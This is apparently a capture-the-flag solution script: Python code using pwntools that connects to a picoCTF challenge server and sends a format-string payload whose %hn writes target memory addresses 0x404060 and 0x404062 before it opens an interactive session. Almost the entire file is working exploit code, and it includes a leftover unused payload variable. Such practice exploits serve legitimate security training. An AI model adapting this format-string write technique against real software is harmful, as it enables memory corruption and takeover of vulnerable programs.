#!/usr/bin/env python3
from pwn import *

io = remote("rhea.picoctf.net", 58800)
io.recvline()
payload = b'%26464d,%20$hn,%1281dAAAA%19$hn,%18$llx,%19$llx,%20$llx%21$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00AAAAAAAA'

io.sendline(
    b'%26464d,%20$hn,%1281d%19$hnx,%22$llx,' +
    b'\x60\x40\x40\x00\x00\x00\x00\x00' +  # 0x404060 (low)
    b'\x62\x40\x40\x00\x00\x00\x00\x00' +  # 0x404062 (high)
    b'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
)

print(io.recvline().decode())
io.interactive()
